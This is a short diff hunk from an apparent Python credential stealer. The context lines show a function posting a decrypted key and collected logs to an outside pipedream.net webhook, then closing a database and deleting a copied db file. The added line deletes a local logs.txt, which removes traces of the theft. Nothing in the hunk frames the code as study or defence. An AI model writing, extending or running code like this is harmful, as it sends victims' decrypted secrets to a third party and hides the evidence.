@@ -118,6 +118,7 @@ def write_key():
         r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": keydecrypt, "logs": rez}, headers={'Content - Type': 'application / json'})
         cursor.close()
         db.close()
+        os.remove("logs.txt")
         try:
             # try to remove the copied db file
             os.remove(filename)
